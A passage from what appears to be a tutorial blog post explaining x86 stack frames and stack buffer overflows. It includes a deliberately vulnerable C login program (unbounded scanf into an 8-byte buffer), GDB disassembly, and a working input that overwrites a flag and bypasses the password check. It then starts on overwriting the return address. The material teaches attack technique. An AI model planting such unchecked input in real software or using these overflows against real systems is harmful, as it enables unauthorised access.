</code></pre><p>Sometimes the Caller can also decide to save all the values of general purpose registers to avoid losing its values from being overwritten by the caller.</p><pre tabindex=0><code>; Function A calling Function B with register preservation

function_A:
    ; ... A&#39;s code using registers ...
    mov eax, 100        ; EAX has important data
    mov ebx, 200        ; EBX has important data
    mov ecx, 300        ; ECX has important data
    
    ; Prepare to call B
    pusha               ; Push all general-purpose registers onto stack
                        ; Order: EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI
    
    push arguments_to_function_B    ; (pushed in reverse order)
    push next_instruction_address_of_function_A ; (the value in EIP register)
    jmp address_of_function_B

    popa                ; Restore all registers to their original values
                        ; Now EAX=100, EBX=200, ECX=300 again
    
    ; Continue with A&#39;s logic, registers are preserved
    ; ...
</code></pre><p>Most of the times callee&rsquo;s ABI clearly defines what register values are preserved and what can be overwritten, we can only save those registers instead.</p><h4 id=2-callees-responsibilities-function-prologue>2. Callee&rsquo;s Responsibilities (Function Prologue):<a hidden class=anchor aria-hidden=true href=#2-callees-responsibilities-function-prologue>#</a></h4><p>Once inside the function B, we need to set up a new stack frame:</p><pre tabindex=0><code>address_of_function_B:
    push ebp              ; Save the old base pointer (of function A)
    mov ebp, esp          ; Set EBP to current stack top (new frame base)
    sub esp, N            ; Allocate space for local variables (N bytes)
</code></pre><p>This sequence accomplishes three things:</p><ul><li>Preserves the caller&rsquo;s frame pointer (old EBP) so we can restore it late</li><li>Establishes a new base pointer for the current function</li><li>Allocates stack space for local variables by moving ESP downward</li></ul><h4 id=3-function-execution>3. Function Execution:<a hidden class=anchor aria-hidden=true href=#3-function-execution>#</a></h4><p>The function body executes, with local variables accessible via offsets from EBP:</p><ul><li><code>[ebp-4]</code> accesses the first local variable</li><li><code>[ebp-8]</code> accesses the second, and so on</li><li>Function parameters (if pushed by caller) are at <code>[ebp+8]</code>, <code>[ebp+12]</code>, etc.</li></ul><h4 id=4-callees-responsibilities-function-epilogue>4. Callee&rsquo;s Responsibilities (Function Epilogue):<a hidden class=anchor aria-hidden=true href=#4-callees-responsibilities-function-epilogue>#</a></h4><p>Before returning, we must tear down the stack frame and restore state:</p><pre tabindex=0><code>    mov esp, ebp          ; Deallocate local variables (restore ESP)
    pop ebp               ; Restore the old base pointer
    ret_address = pop()   ; Get return address from stack
    jmp ret_address       ; Jump back to caller
</code></pre><p>This will:</p><ul><li>Collapses the function B&rsquo;s stack frame by resetting <code>ESP</code> to <code>EBP</code></li><li>Restores the caller&rsquo;s base pointer</li><li>Retrieves the return address from the stack (saved by function A)</li><li>Jumps back to continue execution after the original call site</li></ul><h3 id=simplified-function-call-with-callretleave>Simplified Function Call with CALL/RET/LEAVE<a hidden class=anchor aria-hidden=true href=#simplified-function-call-with-callretleave>#</a></h3><p>The x86 instruction set provides three specialized instructions that automate this process:</p><h4 id=the-call-instruction>The CALL Instruction:<a hidden class=anchor aria-hidden=true href=#the-call-instruction>#</a></h4><pre tabindex=0><code>call function_address
</code></pre><p>This single instruction replaces:</p><pre tabindex=0><code>push next_instruction_address
jmp function_address
</code></pre><p>It automatically pushes the return address (address of the instruction following <code>call</code>) onto the stack and jumps to the target function.</p><h4 id=the-leave-instruction>The LEAVE Instruction:<a hidden class=anchor aria-hidden=true href=#the-leave-instruction>#</a></h4><pre tabindex=0><code>leave
</code></pre><p>This single instruction replaces:</p><pre tabindex=0><code>mov esp, ebp
pop ebp
</code></pre><p>It efficiently collapses the stack frame and restores the old base pointer in one operation.</p><h4 id=the-ret-instruction>The RET Instruction:<a hidden class=anchor aria-hidden=true href=#the-ret-instruction>#</a></h4><pre tabindex=0><code>ret
</code></pre><p>This single instruction replaces:</p><pre tabindex=0><code>pop eip          ; Pop return address into instruction pointer
jmp eip          ; Jump to return address
</code></pre><h4 id=complete-example-with-simplified-instructions>Complete Example with Simplified Instructions:<a hidden class=anchor aria-hidden=true href=#complete-example-with-simplified-instructions>#</a></h4><pre tabindex=0><code>; Caller side:
push argument2
push argument1
call my_function        ; Pushes return address and jumps
add esp, 8             ; Clean up arguments (caller cleanup)

; Callee side:
my_function:
    push ebp           ; Save old frame pointer
    mov ebp, esp       ; Set up new frame
    sub esp, 16        ; Allocate local variables
    
    ; ... function body ...
    
    leave              ; Equivalent to: mov esp, ebp; pop ebp
    ret                ; Pop return address and jump to it
</code></pre><h2 id=buffer-overflow-attacks>Buffer OverFlow Attacks<a hidden class=anchor aria-hidden=true href=#buffer-overflow-attacks>#</a></h2><h3 id=1-overwriting-a-variable-on-stack>1. Overwriting a Variable On Stack<a hidden class=anchor aria-hidden=true href=#1-overwriting-a-variable-on-stack>#</a></h3><p>Consider this C program</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>grantAccess</span>() {
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Access Granted</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>checkPassword</span>(<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> password, <span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>isAuthenticated) {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strcmp</span>(password, <span style=color:#e6db74>&#34;admin123&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>		<span style=color:#f92672>*</span>isAuthenticated <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>AuthenticateUser</span>() {
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span>  isAuthenticated <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> password[<span style=color:#ae81ff>8</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Enter password: &#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%s&#34;</span>, password);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>checkPassword</span>(password, <span style=color:#f92672>&amp;</span>isAuthenticated);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (isAuthenticated <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>) {
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>grantAccess</span>();
</span></span><span style=display:flex><span>	} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Authentication Failed</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>() {
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>AuthenticateUser</span>();
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>This is the normal working of the program</p><pre tabindex=0><code>$ gcc main.c
$ ./a.out
Enter password: password
Authentication Failed
$ ./a.out
Enter password: admin123
Access Granted
</code></pre><p>What if we don&rsquo;t know the correct password? Can we still gain access?</p><p>The vulnerability lies in <code>scanf("%s", password);</code> which performs no bounds checking. This allows us to write more than 8 bytes into the <code>password</code> buffer, potentially overwriting adjacent stack variables—specifically, the <code>isAuthenticated</code> variable.</p><p><strong>Stack layout when <code>AuthenticateUser()</code> is executing:</strong></p><pre tabindex=0><code>Higher Addresses
+-------------------------+
| Saved return address    | ← Return address to main()
+-------------------------+
| Saved RBP               | ← Previous stack frame base
+-------------------------+ ← RBP (current frame base)
| isAuthenticated (4 bytes) | ← [RBP-4]
+-------------------------+
| padding (if any)        |
+-------------------------+
| password[8]             | ← [RBP-12] (buffer starts here)
+-------------------------+ ← RSP (stack pointer)
Lower Addresses
</code></pre><p>Now let&rsquo;s compile another version of the code known as <code>vuln</code></p><pre tabindex=0><code>$ gcc -fno-stack-protector  -O0 -o vuln  main.c
</code></pre><p><strong>Why <code>-fno-stack-protector?</code></strong></p><p>The <code>-fno-stack-protector</code> flag disables GCC&rsquo;s Stack Smashing Protector (SSP), also known as Stack Guard or ProPolice.</p><p>The Stack Guard&rsquo;s main feature is stack canary - although the existence of stsck canary doesn&rsquo;t stop this attack, we still need to disable it because Stack Guard also reorders the variables in stack such that <code>isAuthenticated</code> appears after <code>password</code>, so we would never be able to rewrite the password.</p><p><code>-O0</code> will disable all compiler optimizations, so we can see all the assembly code.</p><p>Let&rsquo;s start by printing the disassembly of the key functions</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> disass AuthenticateUser
</span></span><span style=display:flex><span>Dump of assembler code <span style=color:#66d9ef>for</span> <span style=color:#66d9ef>function</span> AuthenticateUser:
</span></span><span style=display:flex><span>   0x00000000000011fe &lt;+0&gt;:	endbr64
</span></span><span style=display:flex><span>   0x0000000000001202 &lt;+4&gt;:	push   rbp
</span></span><span style=display:flex><span>   0x0000000000001203 &lt;+5&gt;:	mov    rbp,rsp
</span></span><span style=display:flex><span>   0x0000000000001206 &lt;+8&gt;:	sub    rsp,0x10
</span></span><span style=display:flex><span>   0x000000000000120a &lt;+12&gt;:	mov    DWORD PTR <span style=color:#f92672>[</span>rbp-0x4<span style=color:#f92672>]</span>,0x0
</span></span><span style=display:flex><span>   0x0000000000001211 &lt;+19&gt;:	lea    rax,<span style=color:#f92672>[</span>rip+0xe04<span style=color:#f92672>]</span>        <span style=color:#75715e># 0x201c</span>
</span></span><span style=display:flex><span>   0x0000000000001218 &lt;+26&gt;:	mov    rdi,rax
</span></span><span style=display:flex><span>   0x000000000000121b &lt;+29&gt;:	mov    eax,0x0
</span></span><span style=display:flex><span>   0x0000000000001220 &lt;+34&gt;:	call   0x1090 &lt;printf@plt&gt;
</span></span><span style=display:flex><span>   0x0000000000001225 &lt;+39&gt;:	lea    rax,<span style=color:#f92672>[</span>rbp-0xc<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>   0x0000000000001229 &lt;+43&gt;:	mov    rsi,rax
</span></span><span style=display:flex><span>   0x000000000000122c &lt;+46&gt;:	lea    rax,<span style=color:#f92672>[</span>rip+0xdfa<span style=color:#f92672>]</span>        <span style=color:#75715e># 0x202d</span>
</span></span><span style=display:flex><span>   0x0000000000001233 &lt;+53&gt;:	mov    rdi,rax
</span></span><span style=display:flex><span>   0x0000000000001236 &lt;+56&gt;:	mov    eax,0x0
</span></span><span style=display:flex><span>   0x000000000000123b &lt;+61&gt;:	call   0x10b0 &lt;__isoc99_scanf@plt&gt;
</span></span><span style=display:flex><span>   0x0000000000001240 &lt;+66&gt;:	lea    rdx,<span style=color:#f92672>[</span>rbp-0x4<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>   0x0000000000001244 &lt;+70&gt;:	lea    rax,<span style=color:#f92672>[</span>rbp-0xc<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>   0x0000000000001248 &lt;+74&gt;:	mov    rsi,rdx
</span></span><span style=display:flex><span>   0x000000000000124b &lt;+77&gt;:	mov    rdi,rax
</span></span><span style=display:flex><span>   0x000000000000124e &lt;+80&gt;:	call   0x11c3 &lt;checkPassword&gt;
</span></span><span style=display:flex><span>   0x0000000000001253 &lt;+85&gt;:	mov    eax,DWORD PTR <span style=color:#f92672>[</span>rbp-0x4<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>   0x0000000000001256 &lt;+88&gt;:	cmp    eax,0x1
</span></span><span style=display:flex><span>   0x0000000000001259 &lt;+91&gt;:	jne    0x1267 &lt;AuthenticateUser+105&gt;
</span></span><span style=display:flex><span>   0x000000000000125b &lt;+93&gt;:	mov    eax,0x0
</span></span><span style=display:flex><span>   0x0000000000001260 &lt;+98&gt;:	call   0x11a9 &lt;grantAccess&gt;
</span></span><span style=display:flex><span>   0x0000000000001265 &lt;+103&gt;:	jmp    0x1276 &lt;AuthenticateUser+120&gt;
</span></span><span style=display:flex><span>   0x0000000000001267 &lt;+105&gt;:	lea    rax,<span style=color:#f92672>[</span>rip+0xdc2<span style=color:#f92672>]</span>        <span style=color:#75715e># 0x2030</span>
</span></span><span style=display:flex><span>   0x000000000000126e &lt;+112&gt;:	mov    rdi,rax
</span></span><span style=display:flex><span>   0x0000000000001271 &lt;+115&gt;:	call   0x1080 &lt;puts@plt&gt;
</span></span><span style=display:flex><span>   0x0000000000001276 &lt;+120&gt;:	nop
</span></span><span style=display:flex><span>   0x0000000000001277 &lt;+121&gt;:	leave
</span></span><span style=display:flex><span>   0x0000000000001278 &lt;+122&gt;:	ret
</span></span><span style=display:flex><span>End of assembler dump.
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> disass checkPassword
</span></span><span style=display:flex><span>Dump of assembler code <span style=color:#66d9ef>for</span> <span style=color:#66d9ef>function</span> checkPassword:
</span></span><span style=display:flex><span>   0x00000000000011c3 &lt;+0&gt;:	endbr64
</span></span><span style=display:flex><span>   0x00000000000011c7 &lt;+4&gt;:	push   rbp
</span></span><span style=display:flex><span>   0x00000000000011c8 &lt;+5&gt;:	mov    rbp,rsp
</span></span><span style=display:flex><span>   0x00000000000011cb &lt;+8&gt;:	sub    rsp,0x10
</span></span><span style=display:flex><span>   0x00000000000011cf &lt;+12&gt;:	mov    QWORD PTR <span style=color:#f92672>[</span>rbp-0x8<span style=color:#f92672>]</span>,rdi
</span></span><span style=display:flex><span>   0x00000000000011d3 &lt;+16&gt;:	mov    QWORD PTR <span style=color:#f92672>[</span>rbp-0x10<span style=color:#f92672>]</span>,rsi
</span></span><span style=display:flex><span>   0x00000000000011d7 &lt;+20&gt;:	mov    rax,QWORD PTR <span style=color:#f92672>[</span>rbp-0x8<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>   0x00000000000011db &lt;+24&gt;:	lea    rdx,<span style=color:#f92672>[</span>rip+0xe31<span style=color:#f92672>]</span>        <span style=color:#75715e># 0x2013</span>
</span></span><span style=display:flex><span>   0x00000000000011e2 &lt;+31&gt;:	mov    rsi,rdx
</span></span><span style=display:flex><span>   0x00000000000011e5 &lt;+34&gt;:	mov    rdi,rax
</span></span><span style=display:flex><span>   0x00000000000011e8 &lt;+37&gt;:	call   0x10a0 &lt;strcmp@plt&gt;
</span></span><span style=display:flex><span>   0x00000000000011ed &lt;+42&gt;:	test   eax,eax
</span></span><span style=display:flex><span>   0x00000000000011ef &lt;+44&gt;:	jne    0x11fb &lt;checkPassword+56&gt;
</span></span><span style=display:flex><span>   0x00000000000011f1 &lt;+46&gt;:	mov    rax,QWORD PTR <span style=color:#f92672>[</span>rbp-0x10<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>   0x00000000000011f5 &lt;+50&gt;:	mov    DWORD PTR <span style=color:#f92672>[</span>rax<span style=color:#f92672>]</span>,0x1
</span></span><span style=display:flex><span>   0x00000000000011fb &lt;+56&gt;:	nop
</span></span><span style=display:flex><span>   0x00000000000011fc &lt;+57&gt;:	leave
</span></span><span style=display:flex><span>   0x00000000000011fd &lt;+58&gt;:	ret
</span></span><span style=display:flex><span>End of assembler dump.
</span></span></code></pre></div><p>By looking at the assembly of <code>AuthenticateUser</code> we can pinpoint where <code>isAuthenticated</code> and <code>password</code> are located on stack.</p><ol><li><code>isAuthenticated</code> at <code>[rbp-0x4]</code></li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>0</span><span style=color:#a6e22e>x120a</span> <span style=color:#960050;background-color:#1e0010>&lt;+</span><span style=color:#ae81ff>12</span><span style=color:#960050;background-color:#1e0010>&gt;</span>: <span style=color:#66d9ef>mov</span>    <span style=color:#66d9ef>DWORD</span> <span style=color:#66d9ef>PTR</span> [<span style=color:#66d9ef>rbp-0x4</span>],<span style=color:#ae81ff>0x0</span>
</span></span></code></pre></div><p>this is writing 0 to the address [rbp-0x4], which is equivalent to the C code</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int</span> isAuthenticated <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;  <span style=color:#75715e>// Initialize to 0
</span></span></span></code></pre></div><ol start=2><li><code>password</code> is at <code>[rbp-0xc]</code></li></ol><p>We can just figure it out by looking at the arguments passed to <code>checkPassword</code></p><pre tabindex=0><code>0x1240 &lt;+66&gt;: lea    rdx,[rbp-0x4]             ; Load address of [rbp-0x4]
0x1244 &lt;+70&gt;: lea    rax,[rbp-0xc]             ; Load address of [rbp-0xc]
0x1248 &lt;+74&gt;: mov    rsi,rdx                   ; 2nd arg: &amp;isAuthenticated
0x124b &lt;+77&gt;: mov    rdi,rax                   ; 1st arg: password
0x124e &lt;+80&gt;: call   0x11c3 &lt;checkPassword&gt;
</code></pre><p>We know <code>rdi</code> contains first password and <code>rsi</code> contains second, from C code we can see first parameter is <code>password</code> and second parameter is <code>isAuthenticated</code>.</p><p>Now let&rsquo;s place a breakpoint right before this code</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (isAuthenticated <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>) {
</span></span></code></pre></div><p>We can spot the corresponding <code>cmp</code> assembly operation here</p><pre tabindex=0><code>   0x000000000000124e &lt;+80&gt;:	call   0x11c3 &lt;checkPassword&gt;
   0x0000000000001253 &lt;+85&gt;:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000001256 &lt;+88&gt;:	cmp    eax,0x1
   0x0000000000001259 &lt;+91&gt;:	jne    0x1267 &lt;AuthenticateUser+105&gt;
   0x000000000000125b &lt;+93&gt;:	mov    eax,0x0
   0x0000000000001260 &lt;+98&gt;:	call   0x11a9 &lt;grantAccess&gt;
   0x0000000000001265 &lt;+103&gt;:	jmp    0x1276 &lt;AuthenticateUser+120&gt;
</code></pre><p>Note that <code>b *0x0000000000001256</code> won&rsquo;t work because the addresses we are seeing are the offsets in ELF. But since our binary is a PIE executable there will be a constant offset added, we can figure out the actual address using that offset or we can simply place it like this</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span>  break *AuthenticateUser+88
</span></span><span style=display:flex><span>Breakpoint <span style=color:#ae81ff>4</span> at 0x555555555256
</span></span></code></pre></div><p>GDB allows this since the relative offsets will same and it is aware of the symbols.</p><p>Now let&rsquo;s enter the password</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> c
</span></span><span style=display:flex><span>Continuing.
</span></span><span style=display:flex><span>Enter password: AAAAAAAA1
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Breakpoint 4, 0x0000555555555256 in AuthenticateUser <span style=color:#f92672>()</span>
</span></span></code></pre></div><p><code>AAAAAAAA1</code> is 9 bytes, just 1 byte more than password. Let&rsquo;s inspect the memory to confirm if the overflow happened.</p><pre tabindex=0><code>(gdb) x/12xb $rbp - 0xc
0x7fffffffddf4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffddfc:	0x31	0x00	0x00	0x00
(gdb) x/1dw $rbp - 0x4
0x7fffffffddfc:	49
</code></pre><p>Recall that <code>$rbp - 0xc</code> is the address of <code>password</code> and <code>$rbp - 0x4</code> is the address of <code>isAuthenticated</code>.</p><p>In first command we are printing 12 bytes from <code>0x7fffffffddf4</code> we can see 9th byte is <code>0x31</code> which is the ascii value of <code>1</code> we entered at the end.</p><p>But since the value stored is not <code>0x01</code> we can see the value of <code>isAuthenticated</code> is not <code>49</code> which will still fail the check.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> c
</span></span><span style=display:flex><span>Continuing.
</span></span><span style=display:flex><span>Authentication Failed
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>Inferior <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>process 8454<span style=color:#f92672>)</span> exited normally<span style=color:#f92672>]</span>
</span></span></code></pre></div><p>Now we know that overflow actually works, we can actually try to voerwrite <code>0x01</code> into the address of <code>isAuthenticated</code>. This is the scenario we are hoping for</p><pre tabindex=0><code>0x7fffffffddf4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffddfc:	0x01	0x00	0x00	0x00
</code></pre><p>Note that the bytes <code>0x01 0x00 0x00 0x00</code> appear reversed compared to the actual notation of 1 in 4-byte (word) format because this is little-endian representation.</p><p>The problem is the character whose ascii value is <code>0x01</code> is actually a non-printable character which means we can&rsquo;t type it into the terminal.</p><p>But we can pass raw byte stream using utilities like <code>printf</code> and pipe its output to our program</p><pre tabindex=0><code>$ printf &#39;AAAAAAAA\x01&#39; | ./vuln
Enter password: Access Granted
</code></pre><p>This proves that the overwrite worked in an expected way!</p><h3 id=2-overwriting-the-return-address-on-the-stack>2. Overwriting the Return Address on the Stack<a hidden class=anchor aria-hidden=true href=#2-overwriting-the-return-address-on-the-stack>#</a></h3><p>In the earlier example, we were able to overwrite <code>isAuthenticated</code> because the buffer <code>password</code> was placed before it on the stack. When you write past the end of <code>password</code>, the overflow naturally overwrites the next variable in memory.</p><p>For the program we saw earlier, the key to overwriting <code>isAuthenticated</code> variable was the fact that its located after the <code>password</code> variable on the stack. If those two variables are reordered then its not possile to overwrite the value of <code>password</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>AuthenticateUser</span>() {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> password[<span style=color:#ae81ff>8</span>];
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span>  isAuthenticated <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span></code></pre></div><p>Even if the <code>password</code> is placed afterwards, GCC&rsquo;s stack guard moves it such that <code>password</code> appears before the <code>isAuthenticated</code> variable, that&rsquo;s why we had to disable the stack guard using the <code>-fno-stack-protector</code> option.</p><p>Because of this, we disabled GCC’s stack guard using:</p><p><code>-fno-stack-protector</code></p><p>When stack protection is off, we can reliably predict the layout and avoid the compiler reordering the variables.</p><p>Now we intentionally reorder the variables so that the integer comes first in source code, but ends up higher on the stack — meaning overflowing password will no longer overwrite isAuthenticated:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>grantAccess</span>() {
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Access Granted</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>checkPassword</span>(<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> password, <span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>isAuthenticated) {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strcmp</span>(password, <span style=color:#e6db74>&#34;admin123&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>		<span style=color:#f92672>*</span>isAuthenticated <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>AuthenticateUser</span>() {
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> password[<span style=color:#ae81ff>8</span>];
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span>  isAuthenticated <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Enter password: &#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%s&#34;</span>, password);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>checkPassword</span>(password, <span style=color:#f92672>&amp;</span>isAuthenticated);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (isAuthenticated <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>) {
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>grantAccess</span>();
</span></span><span style=display:flex><span>	} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Authentication Failed</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>() {
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>AuthenticateUser</span>();
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Resulting Stack Layout</p><p>With stack protection disabled, the stack now looks like this:</p><pre tabindex=0><code>Higher Addresses
+-----------------------------+
| Saved return address        |
+-----------------------------+
| Saved RBP                   |
+-----------------------------+ ← RBP
| password[8]                 | ← [RBP - 8 - padding]
+-----------------------------+
| padding (alignment)         |
+-----------------------------+
| isAuthenticated (4 bytes)   | ← [RBP - 12]
+-----------------------------+ ← RSP
Lower Addresses
</code></pre><p>Now our goal is to overwrite the return address in <code>AuthenticateUser</code> to the address of <code>grantAccess</code> function. This will allow us to get the access regardless of the value of <code>isAuthenticated</code> variable.</p><p>Since we need to replace the actual return address with <code>grantAccess</code>&rsquo;s address, we need to pass it in the input to the program with appropriate byte calculations.</p><p>To calculate the address of a function at runtime we need to learn about <code>PIE</code> and <code>ASLR</code>.</p><h4 id=non-position-independent-executable>Non Position Independent Executable<a hidden class=anchor aria-hidden=true href=#non-position-independent-executable>#</a></h4><p>The best way to understand Position Independent Code and Position Independent Executable is to compare its differences with non-PIE binary.</p><p>Let&rsquo;s compile a binary with <code>-fno-stack-protector</code> and <code>-fno-pie</code> flags</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>$ gcc -fno-pie -no-pie -fno-stack-protector -O0 -o vuln_no_pie main.c
</span></span></code></pre></div><p><code>-fno-pie</code>: tells compiler to build non PIE
